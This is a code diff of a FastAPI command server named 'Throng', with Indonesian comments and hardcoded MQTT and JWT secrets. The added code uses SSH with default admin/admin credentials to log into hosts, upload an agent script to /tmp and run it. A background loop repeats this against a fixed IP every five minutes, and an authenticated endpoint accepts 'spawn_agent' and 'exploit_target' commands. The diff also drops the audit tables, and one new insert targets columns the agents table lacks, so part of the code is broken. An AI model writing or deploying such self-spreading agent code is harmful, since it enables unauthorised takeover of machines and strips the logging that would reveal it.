@@ -13,18 +13,20 @@ from paho.mqtt.client import CallbackAPIVersion
 import jwt
 from sklearn.ensemble import IsolationForest
 import numpy as np
+import paramiko
+import threading
 
 app = FastAPI()
-app.mount("/static", StaticFiles(directory="static"), name="static")  # Untuk melayani file statis seperti CSS
-templates = Jinja2Templates(directory="templates")  # Konfigurasi Jinja2 untuk templating
+app.mount("/static", StaticFiles(directory="static"), name="static")
+templates = Jinja2Templates(directory="templates")
 security = HTTPBearer()
 
 # Konfigurasi JWT dan MQTT
 JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
 JWT_ALGORITHM = "HS256"
 MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
-MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")  # Ganti dengan usernamemu
-MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")  # Ganti dengan passwordmu
+MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
+MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
 
 # Model untuk perintah
 class Command(BaseModel):
@@ -40,14 +42,10 @@ def init_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS reports 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
     c.execute('''CREATE TABLE IF NOT EXISTS agents 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT)''')
+                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
     c.execute('''CREATE TABLE IF NOT EXISTS targets 
                  (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
     conn.commit()
     conn.close()
 
@@ -58,12 +56,12 @@ mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
 def on_connect(client, userdata, flags, rc, properties=None):
     print(f"MQTT connected with result code {rc}")
     if rc == 0:
-        client.subscribe("throng/#")  # Subscribe ke semua topik Throng
+        client.subscribe("throng/#")
 mqtt_client.on_connect = on_connect
-mqtt_client.tls_set()  # Aktifkan TLS untuk HiveMQ Cloud
+mqtt_client.tls_set()
 mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
 mqtt_client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)
-time.sleep(1)  # Tunggu koneksi stabil
+time.sleep(1)
 mqtt_client.loop_start()
 
 # Model Isolation Forest
@@ -85,6 +83,47 @@ async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(secur
     except jwt.PyJWTError:
         raise HTTPException(status_code=401, detail="Invalid token")
 
+# Fungsi spawn agent otomatis
+def spawn_agent_automatically(target, credentials):
+    try:
+        new_agent_id = str(uuid.uuid4())
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=credentials.get("username", "admin"), password=credentials.get("password", "admin"))
+        sftp = ssh.open_sftp()
+        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
+        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
+        sftp.close()
+        ssh.close()
+        conn = sqlite3.connect("throng.db")
+        c = conn.cursor()
+        c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
+                  (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
+        conn.commit()
+        conn.close()
+        print(f"Spawned agent {new_agent_id} on {target}")
+        return new_agent_id
+    except Exception as e:
+        print(f"Error spawning agent: {e}")
+        return None
+
+# Pemantauan otomatis
+def auto_monitor():
+    while True:
+        conn = sqlite3.connect("throng.db")
+        c = conn.cursor()
+        c.execute("SELECT data FROM reports ORDER BY timestamp DESC LIMIT 10")
+        reports = [json.loads(row[0]) for row in c.fetchall()]
+        conn.close()
+        anomalies = analyze_threats(reports)
+        if any(anomalies) or len(reports) < 3:  # Jika ada ancaman atau agent terlalu sedikit
+            target = "192.168.1.10"  # Ganti dengan IP target yang valid
+            credentials = {"username": "admin", "password": "admin"}  # Ganti dengan kredensial yang valid
+            spawn_agent_automatically(target, credentials)
+        time.sleep(300)  # Cek setiap 5 menit
+
+threading.Thread(target=auto_monitor, daemon=True).start()
+
 # Endpoint untuk token
 @app.get("/token")
 async def get_token():
@@ -97,14 +136,12 @@ async def get_token():
 async def get_dashboard_data():
     conn = sqlite3.connect("throng.db")
     c = conn.cursor()
-    c.execute("SELECT agent_id, status, last_seen, ip FROM agents")
-    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
+    c.execute("SELECT agent_id, status, last_seen, ip, host FROM agents")
+    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3], "host": row[4]} for row in c.fetchall()]
     c.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
     targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in c.fetchall()]
     c.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
     reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in c.fetchall()]
-    c.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
-    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in c.fetchall()]
     conn.close()
     
     anomalies = analyze_threats(reports)
@@ -123,7 +160,7 @@ async def get_dashboard_data():
         ]
     }
     
-    return {"agents": agents, "targets": targets, "reports": reports, "emergency_logs": emergency_logs, "network": network_data}
+    return {"agents": agents, "targets": targets, "reports": reports, "network": network_data}
 
 # Endpoint untuk perintah
 @app.post("/command", dependencies=[Depends(verify_token)])
@@ -134,16 +171,18 @@ async def send_command(command: Command):
     
     conn = sqlite3.connect("throng.db")
     c = conn.cursor()
-    if command.target:
+    if command.action == "spawn_agent" and command.target:
+        new_agent_id = spawn_agent_automatically(command.target, command.params.get("credentials", {"username": "admin", "password": "admin"}))
+        if new_agent_id:
+            c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
+                      (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
+    elif command.target:
         if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
-            c.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
+            c.execute("INSERT INTO agents (agent_id, target, action) VALUES (?, ?, ?)", 
                       (command.agent_id, command.target, command.action))
         elif command.action == "scan_target":
             c.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
                       (command.target, "pending", 0.0))
-        if command.emergency:
-            c.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
-                      (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
     conn.commit()
     conn.close()
 
